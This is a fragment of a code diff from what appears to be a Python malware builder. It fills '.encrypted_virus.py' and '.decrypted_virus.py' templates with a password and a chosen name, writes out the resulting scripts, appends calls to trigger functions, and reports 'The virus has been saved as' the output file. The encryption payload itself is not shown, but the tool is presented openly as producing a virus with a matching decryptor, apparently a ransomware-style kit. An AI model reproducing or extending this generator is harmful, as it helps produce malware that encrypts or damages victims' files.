 					filedata = file.read()
-					filedata = filedata.replace('abcde', nun)
-					filedata = filedata.replace('passe', password)
-				#########
-				with open('.encrypted_virus.py', 'w') as file:
-				 file.write(filedata)
-				 ########
-				 old_name = r".encrypted_virus.py"
-				 new_name = (new + '.py')
-				#############
-				os.rename(old_name, new_name)
-				############
-				import os
-				original = r'.encrypted_virus1.py'
-				target = r'.encrypted_virus.py'
-				os.rename(original, target)
- ###########################
- ##########Decrypted##########
- ###########################
-				Open = r'.decrypted_virus.py'
-				Open1 = r'.decrypted_virus1.py'
-				shutil.copyfile(Open, Open1)
-				 ########
-				old_name = r".decrypted_virus.py"
-				new_name = (new + '_decrypted.py')
-				#############
-				os.rename(old_name, new_name)
-				############
+					filedata = filedata.replace('abcde', non)
+					filedata = filedata.replace("passe", password)
+					filedata = filedata.replace("encrypted_name", "")
+					filedata = filedata.replace("pass", "")
+				with open(encrypted_name+'.py',"w") as file:
+					file.write(filedata)
+				with open(encrypted_name+'.py',"a") as file:
+					file.write("funktion2()")
+				with open(encrypted_name+'_decrypted.py',"r") as file:
+					filedata = file.read()
+					filedata = filedata.replace("decrypted_name", "")
+					filedata = filedata.replace("pass", "")
+				with open(encrypted_name+'_decrypted.py',"w") as file:
+					file.write(filedata)
+				with open(encrypted_name+'_decrypted.py',"a") as file:
+					file.write("funktion1()")
 				ascii()
-				print(White+'The virus has been saved as ' +RED+ new + '.py')
-				import os
-				original = r'.decrypted_virus1.py'
-				target = r'.decrypted_virus.py'
-				os.rename(original, target)
+				print(White+'The virus has been saved as ' +RED+ encrypted_name + '.py')
 #################################
 				def restart():
 				    while True:
